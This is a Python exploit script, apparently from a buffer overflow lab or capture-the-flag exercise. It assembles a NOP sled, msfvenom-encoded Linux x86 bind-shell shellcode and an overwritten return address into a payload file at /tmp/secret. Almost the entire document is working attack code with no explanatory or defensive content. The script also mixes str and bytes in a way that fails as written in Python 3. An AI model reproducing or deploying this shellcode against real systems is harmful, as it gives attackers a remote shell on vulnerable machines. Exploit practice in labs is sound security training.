#!/usr/bin/python3
# A bunch of nops
nopsled = '\x90' * (1020 - 232)
# Buffer size - Payload size
# Payload of 232 bytes
# Generated using msfvenom
# msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
buf = b""
buf += b"\x89\xe6\xda\xd1\xd9\x76\xf4\x5b\x53\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x76\x51\x59\x4b\x6a"
buf += b"\x57\x38\x63\x73\x63\x42\x63\x42\x73\x52\x4a\x33\x32"
buf += b"\x6e\x69\x79\x71\x6e\x50\x71\x76\x4a\x6d\x4b\x30\x43"
buf += b"\x6b\x51\x4e\x31\x42\x43\x58\x73\x32\x33\x30\x77\x61"
buf += b"\x63\x6c\x42\x4a\x62\x30\x30\x51\x52\x70\x6d\x59\x6b"
buf += b"\x51\x51\x7a\x33\x56\x52\x78\x78\x4d\x4f\x70\x6c\x49"
buf += b"\x52\x61\x55\x54\x58\x33\x45\x54\x4c\x70\x75\x36\x68"
buf += b"\x4d\x4b\x30\x51\x53\x4e\x50\x42\x46\x5a\x6d\x4f\x70"
buf += b"\x7a\x33\x32\x79\x52\x4a\x77\x4f\x76\x38\x7a\x6d\x6d"
buf += b"\x50\x77\x39\x62\x59\x78\x78\x73\x58\x76\x4f\x66\x4f"
buf += b"\x54\x33\x50\x68\x51\x78\x44\x6f\x31\x72\x35\x39\x72"
buf += b"\x4e\x4e\x69\x59\x73\x32\x70\x61\x43\x4d\x59\x6d\x31"
buf += b"\x68\x30\x74\x4b\x48\x4d\x6f\x70\x34\x71\x39\x4b\x43"
buf += b"\x5a\x35\x51\x43\x68\x58\x4d\x6f\x70\x41\x41"
# The instruction pointer
eip = '\x3c\xdb\xff\xff' #0xffffdc3c
# Final Payload
payload = nopsled + buf + eip
# Writing the payload to /tmp/secret file
fp = open("/tmp/secret", "w")
fp.write(payload)
fp.close()